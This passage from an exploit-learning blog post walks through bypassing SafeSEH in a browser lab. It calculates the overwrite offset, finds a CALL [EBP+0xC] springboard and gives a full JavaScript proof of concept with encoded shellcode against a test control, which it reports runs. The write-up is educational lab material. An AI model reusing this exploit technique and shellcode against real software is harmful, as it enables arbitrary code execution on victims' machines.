</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u3001\u3008&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=nx>shellcode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=analysis>Analysis</h4><ul><li>As shown in the figure, the address <code>0x01DCF4FC</code> pointed by ecx is the starting address of the overflow string, and the closest exception function address to the top of the stack is located at <code>0x01DCF610</code>, which is calculated to fill <code>0x114</code> which is 276 bytes to cover the exception handling function address, and the 277th-280th bytes can be placed in the springboard</li></ul><p><img src=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/address.png width=1920 height=1080 srcset="/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/address_huecaaf311869531e210858566e2684962_174105_480x0_resize_box_3.png 480w, /posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/address_huecaaf311869531e210858566e2684962_174105_1024x0_resize_box_3.png 1024w" loading=lazy alt=address class=gallery-image data-flex-grow=177 data-flex-basis=426px><br><img src=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/sehchain.png width=356 height=287 srcset="/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/sehchain_hu90baa6dbeb8a56abc1f06346472feba6_18267_480x0_resize_box_3.png 480w, /posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/sehchain_hu90baa6dbeb8a56abc1f06346472feba6_18267_1024x0_resize_box_3.png 1024w" loading=lazy alt="SEH chain" class=gallery-image data-flex-grow=124 data-flex-basis=297px><br><img src=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/exceptionaddress.png width=363 height=162 srcset="/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/exceptionaddress_hu152a96d2dd97a392d701fc959f25976c_8126_480x0_resize_box_3.png 480w, /posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/exceptionaddress_hu152a96d2dd97a392d701fc959f25976c_8126_1024x0_resize_box_3.png 1024w" loading=lazy alt="Exception address" class=gallery-image data-flex-grow=224 data-flex-basis=537px></p><ul><li>Using the <code>OllyFindAddr</code> plugin&rsquo;s <code>Overflow return address->Find CALL/JMP[EBP+N]</code> option to find the instruction, this experiment found the <code>CALL [EBP+0xC]</code> of <code>0x300B2D1C</code> as a springboard, as shown in the figure</li></ul><p><img src=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/springboard.png width=694 height=68 srcset="/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/springboard_huc399a4050ed0f796541f82748fca3071_5124_480x0_resize_box_3.png 480w, /posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/springboard_huc399a4050ed0f796541f82748fca3071_5124_1024x0_resize_box_3.png 1024w" loading=lazy alt=springboard class=gallery-image data-flex-grow=1020 data-flex-basis=2449px></p><ul><li>According to the previous calculation put the springboard address into the shellcode corresponding location, save the POC page, test change the function as follows</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>138</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u2D1C\u300B&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>It is said in the book that at this time the trigger except 0 exception will be transferred to the shellcode springboard, but it seems that the operation is not written in advance, so again compile the plug-in, in the test function to add except 0 operation</li><li>At this point, the successful break at the springboard, the EBP register value is <code>0x01DCF150</code>, according to the springboard instructions will jump to the springboard address before the 4 bytes, where you can add a jump, and shellcode to the back, as follows</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>01DCF60C   /EB 06           jmp short 01DCF614			; jump
</span></span><span class=line><span class=cl>01DCF60E   |90              nop
</span></span><span class=line><span class=cl>01DCF60F   |90              nop
</span></span><span class=line><span class=cl>01DCF610   |1C 2D           sbb al,0x2D					; addr
</span></span><span class=line><span class=cl>01DCF612   |0B30            or esi,dword ptr ds:[eax]	; addr
</span></span><span class=line><span class=cl>01DCF614   \90              nop							; shellcode payload start
</span></span></code></pre></td></tr></table></div></div><ul><li>The final test function is shown below</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>136</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u06EB\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u2D1C\u300B&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Successfully executed as shown</li></ul><p><img src=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/success.png width=803 height=600 srcset="/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/success_hue116a4caf66dbfeb0b33a048a14a81ba_55977_480x0_resize_box_3.png 480w, /posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/success_hue116a4caf66dbfeb0b33a048a14a81ba_55977_1024x0_resize_box_3.png 1024w" loading=lazy alt="Execution successful" class=gallery-image data-flex-grow=133 data-flex-basis=321px></p></section><footer class=article-footer><section class=article-tags><a href=/tags/windows/>Windows</a>
<a href=/tags/safeseh/>SafeSEH</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/posts/exploit-learning-notes-021-protected-heap/><div class=article-details><h2 class=article-title>Exploit learning notes 021 Protected HEAP</h2></div></a></article><article><a href=/posts/exploit-learning-notes-020-sehop-introduction/><div class=article-details><h2 class=article-title>Exploit learning notes 020 SEHOP introduction</h2></div></a></article><article><a href=/posts/exploit-learning-notes-019-using-heapspray-attack-aslr/><div class=article-details><h2 class=article-title>Exploit learning notes 019 Using HeapSpray Attack ASLR</h2></div></a></article><article><a href=/posts/exploit-learning-notes-018-using-partial-overlay-location/><div class=article-details><h2 class=article-title>Exploit learning notes 018 using partial overlay location</h2></div></a></article><article><a href=/posts/exploit-learning-notes-017-aslr-introduction/><div class=article-details><h2 class=article-title>Exploit learning notes 017 ASLR Introduction</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=Moeomu/blog data-repo-id=R_kgDOHHJl4A data-category=Announcements data-category-id=DIC_kwDOHHJl4M4CR7uM data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2023 Misaka's Secrect Garden</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>